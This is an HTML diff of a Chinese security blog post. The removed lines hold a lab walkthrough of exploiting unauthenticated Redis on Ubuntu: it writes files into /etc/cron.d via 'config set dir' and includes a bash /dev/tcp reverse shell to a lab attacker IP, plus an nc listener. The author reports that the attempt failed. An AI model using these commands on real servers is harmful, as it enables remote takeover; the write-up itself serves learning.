@@ -344,52 +344,14 @@
 
       
         
-          
-            <h1 id="记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现"><a href="#记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现" class="headerlink" title="记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现"></a>记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现</h1><p><strong>由于redis的配置不当导致攻击者可以利用该未授权访问漏洞去对服务器进行攻击，redis服务默认端口为6379端口，在利用该漏洞的时候，由于服务器是ubuntu的原因，遇到了不少坑导致最终并没有利用成功，不像之前在centos环境下利用该漏洞时那样顺利，所以在这里记录一下。在理解这篇文章之前，可以先参考一下之前的<a href="http://lawlietweb.com/2018/08/17/2018-08-17/#more" target="_blank" rel="external">解决ubuntu任务计划写shell失败的问题</a>和<a href="http://lawlietweb.com/2018/08/18/2018-08-18/#more" target="_blank" rel="external">关于ubuntu和centos cron的一些区别</a>这两篇文章</strong></p>
-<h3 id="漏洞环境及搭建"><a href="#漏洞环境及搭建" class="headerlink" title="漏洞环境及搭建"></a>漏洞环境及搭建</h3><p><strong>ubuntu16.04（192.168.0.107）：安装了redis服务的靶机,作为redis-server</strong></p>
-<p><strong>kali2.0（192.168.0.101）：攻击者机器，同样安装了redis，要使用redis-cli对未授权访问漏洞进行利用</strong></p>
-<p><strong>该实验中redis的版本为4.0.8，安装redis方法如下</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">wget http://download.redis.io/releases/redis-4.0.8.tar.gz</div><div class="line">tar –xvf redis-4.0.8.tar.gz</div><div class="line"><span class="built_in">cd</span> redis-4.0.8</div><div class="line">make</div></pre></td></tr></table></figure>
-<p><strong>ubuntu安装完redis后，还需要修改redis配置文件redis.conf里面的几个地方</strong></p>
-<pre><code>1.bind 127.0.0.1前面需要加上注释符
-2.protected-mode要修改为no
-</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180816/HkF3EJj621.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180816/31fij0h7l1.png?imageslim" alt="mark"></p>
-<h3 id="尝试利用linux任务计划文件去反弹shell"><a href="#尝试利用linux任务计划文件去反弹shell" class="headerlink" title="尝试利用linux任务计划文件去反弹shell"></a>尝试利用linux任务计划文件去反弹shell</h3><p><strong>首先在ubuntu上开启redis服务</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> redis-4.0.8</div><div class="line">./src/redis-server redis.conf</div></pre></td></tr></table></figure>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/li4i2IkkDB.png?imageslim" alt="mark"></p>
-<p><strong>由于redis的默认配置会直接导致未授权访问，所以在kali上使用redis-cli去访问ubuntu靶机上的redis服务，这里看到可以直接进入redis的交互式shell</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> redis-4.0.8</div><div class="line">./src/redis-cli -h 192.168.0.107 -p 6379</div></pre></td></tr></table></figure>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/fffCjfk2Ie.png?imageslim" alt="mark"><br><strong>现在尝试结合linux任务计划文件去反弹一个shell到自己的kali上面。</strong></p>
-<p><strong>首先简单来说一下linux中的任务计划文件，简单来说，任务计划指的就是使系统定时的去执行一些我们设置的任务，来看一下该文件的格式</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /etc/crontab</div></pre></td></tr></table></figure>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180816/9EDGkJ5K49.png?imageslim" alt="mark"></p>
-<p><strong>里面的参数和一些符号含义如下</strong></p>
-<pre><code>m:分钟 - 从0到59的整数
-h:小时 - 从0到23的整数
-dom:天 - 从1到31的整数 (必须是指定月份的有效日期)
-mon:月 - 从1到12的整数 (或如Jan或Feb简写的月份)
-dow:周一到周日 - 从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示)
-user:指的是执行命令的用户
-command: 需要执行的命令
-星号(*)表示参数所有可用的值，如果为5个*，就代表每分钟执行一次
-符号“/”指定步进设置。“/&lt;interger&gt;”表示步进值,比如*/2 * * * *代表每两分钟执行一次任务
-</code></pre><p><strong>ubuntu下可以利用的cron有以下几个地方</strong></p>
-<pre><code>/etc/crontab：该文件里面的任务计划可以直接执行
-/etc/cron.d/*：该目录下的任意文件都可以被当作任务计划去执行，并且避免了原先任务计划文件被覆盖的情况
-/var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，不过需要有一个前提，就是该任务计划文件的权限必须为600
-</code></pre><p><strong>知道了以上的知识，可以通过redis未授权访问漏洞向ubuntu的<code>/etc/cron.d</code>目录下写任务计划文件去反弹shell,首先在kali上监听端口等待连接，我的思路是这样的，首先向/etc/cron.d下写一个任务计划文件step1，文件内容为<code>* * * * * root ln -s -f bash /bin/sh</code>，首先将ubuntu的cron的shell环境由dash改为bash，这样才可以使用交互式命令，之后再在<code>/etc/cron.d</code>目录下创建一个任务计划文件step2，内容为<code>* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777</code>,也就是使用交互式的bash去反弹shell到kali</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -nvlp 7777</div></pre></td></tr></table></figure>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/bbl7Dm2Hea.png?imageslim" alt="mark"><br><strong>接下来在redis-cli命令行输入</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n\n\n* * * * * root ln -s -f bash /bin/sh\n\n\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /etc/cron.d</div><div class="line">config <span class="built_in">set</span> dbfilename step1</div><div class="line">save</div><div class="line"><span class="built_in">set</span> bbb <span class="string">"\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1\n\n\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /etc/cron.d</div><div class="line">config <span class="built_in">set</span> dbfilename step2</div><div class="line">save</div></pre></td></tr></table></figure>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/gGeJheDh71.png?imageslim" alt="mark"></p>
-<p><strong>这里有一个需要注意的地方就是在设置变量的时候，也就是设置任务计划文件里的内容时，<code>\n</code>这个符号前后分别不能小于2个，否则文件内容会出现乱码导致命令执行失败，这是其中一个坑,可以看到<code>/etc/cron.d</code>目录下分别成功创建了一个名为step1和step2的任务计划文件</strong></p>
-<p><strong>文件内容分别为</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/aL0DJmLL5D.png?imageslim" alt="mark"></p>
-<p><strong>但是shell还是反弹失败了，<code>/bin/sh</code>的指向也没有修改成功，通过查看日志可以看到这一次的错误原因是<code>ERROR (Syntax error, this crontab file will be ignored)</code></strong></p>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/848Lkaj8EF.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/4IdFkL5gci.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/E2h2Fm7ffc.png?imageslim" alt="mark"></p>
-<p><strong>这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，因为自己如果不使用redis写任务计划文件，而是正常向<code>/etc/cron.d</code>目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码</strong></p>
-<h3 id="对于这一次失败的总结和看法"><a href="#对于这一次失败的总结和看法" class="headerlink" title="对于这一次失败的总结和看法"></a>对于这一次失败的总结和看法</h3><p><strong>对于ubuntu环境下的redis未授权访问漏洞写任务计划反弹shell的利用，自己遇到了很多坑，自己都一一排查解决了，结果最终还是在乱码这个问题上失败了，也可以看出确实ubuntu在某些方面设计的还是要比centos安全的，虽然这次漏洞利用失败了，但是自己也学到了不少，对centos和ubuntu这两个系统的cron的区别以及一些其它的安全机制有了更深的认识，所以，这一切都是值得的</strong></p>
-
-          
+          <h1 id="记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现"><a href="#记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现" class="headerlink" title="记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现"></a>记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现</h1><p><strong>由于redis的配置不当导致攻击者可以利用该未授权访问漏洞去对服务器进行攻击，redis服务默认端口为6379端口，在利用该漏洞的时候，由于服务器是ubuntu的原因，遇到了不少坑导致最终并没有利用成功，不像之前在centos环境下利用该漏洞时那样顺利，所以在这里记录一下。在理解这篇文章之前，可以先参考一下之前的<a href="http://lawlietweb.com/2018/08/17/2018-08-17/#more" target="_blank" rel="external">解决ubuntu任务计划写shell失败的问题</a>和<a href="http://lawlietweb.com/2018/08/18/2018-08-18/#more" target="_blank" rel="external">关于ubuntu和centos cron的一些区别</a>这两篇文章</strong><br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/08/19/2018-08-19/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
